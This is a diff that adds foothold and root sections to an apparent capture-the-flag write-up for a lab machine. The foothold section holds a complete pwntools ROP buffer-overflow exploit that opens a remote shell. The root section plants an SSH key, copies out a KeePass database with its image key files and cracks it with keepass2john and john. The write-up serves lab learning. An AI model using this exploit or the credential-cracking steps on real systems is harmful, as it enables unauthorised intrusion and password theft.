@@ -133,8 +133,115 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ![](./images/3.png)
 
-## Foothold
+## Foothold/User
+- Let's debug `myapp`
+
+![](./images/4.png)
+
+- `main` function
+  - The variable is `0x70` bytes away from the top of the stack
+
+![](./images/5.png)
+
+- Let's find an offset
+  - Type `set follow-fork-mode parent` since `pwndbg` and `peda` sets follow mode to child, while `gdb` sets it to parent by default
+  - Create pattern: `msf-pattern_create -l 150`
+  - Run and input the pattern
+  - Search the offset: `msf-pattern_offset -q Ae0A` (based on screen)
+
+![](./images/6.png)
+![](./images/7.png)
+
+- We can check if the offset found is correct
+  - Execute: `python3 -c 'print("A"*120 + "B" * 8)'`
+  - Run and input the string generated
+
+![](./images/8.png)
+
+- Okay, now we need to come up with a strategy 
+  - I also found `test` function, which is never called
+
+![](./images/9.png)
+
+- We can try putting `system` address to `r13` and place `/bin/sh` on top of the stack
+  - And then call `test()`
+  - Which should give us a shell
+  - But we need a gadget to put `system` to `r13`
+  - Let's search for gadgets
+    - We can do it with `ropper`
+    - Install: `sudo apt install ropper`
+    - Run: `ropper myapp | grep r13`
 
 
+![](./images/10.png)
+
+- We can choose 2-nd option
+  - Our final exploit
+
+```
+#MAIN: 0040115f 
+#pop r13: 00401206
+#test: 00401152
+#system: 0040116e
+
+from pwn import *
+p = remote("10.10.10.147", 1337)
+context(os='linux', arch='amd64')
+
+padding = ("A" * 112).encode()
+payload = "/bin/sh\x00".encode()
+ret_system = p64(0x40116e)
+pop_r13 = p64(0x401206)
+junk = p64(0x0)
+ret_test = p64(0x401152)
+
+p.sendline(padding + payload + pop_r13 + ret_system + junk + junk + ret_test)
+p.interactive()
+```
+
+- Let's run it
+
+![](./images/11.png)
 
 ## Root
+- Enumerate for privesc
+  - We see `MyPasswords.kdbx`
+  - And also other `jpg` files
+
+![](./images/12.png)
+
+- We can upgrade our shell via `ssh`, so we can download the file
+  - `cd /home/user/.ssh/`
+  - If you have generated `id_rsa` key, simply use the value in `id_rsa.pub` and save it to `authorized_keys` like down below
+    - If not, generate it and do the same thing
+  - `$ echo 'ssh-rsa AAAAB3NzaC1yc2EA...' > authorized_keys` 
+  - ssh to box using your `id_rsa`: `ssh -i id_rsa user@10.10.10.147`
+
+![](./images/13.png)
+
+- Now we can download `MyPasswords.kdbx` and `JPG` files
+  - `scp  -i id_rsa user@10.10.10.147:~/MyPasswords.kdbx ./`
+  - `scp  -i ~/.ssh/id_rsa user@10.10.10.147:~/*.JPG ./`
+
+![](./images/14.png)
+![](./images/15.png)
+
+- Since there is an option to protect `DB` file using `key file`
+  - We can assume that those `JPG` file as `key files`, so we can create hashes for each of the six images as keyfiles
+  - `for i in *.JPG; do (keepass2john -k $i MyPasswords.kdbx >> hashes.txt); done;`
+
+![](./images/20.png)
+![](./images/16.png)
+
+- Use `john` to crack the hashes
+
+![](./images/17.png)
+
+- Once we get our password we can use it to explore `MyPasswords.kdbx`
+  - We see the `Root password` entry
+
+![](./images/18.png)
+
+- Use it to `su`
+
+![](./images/19.png)
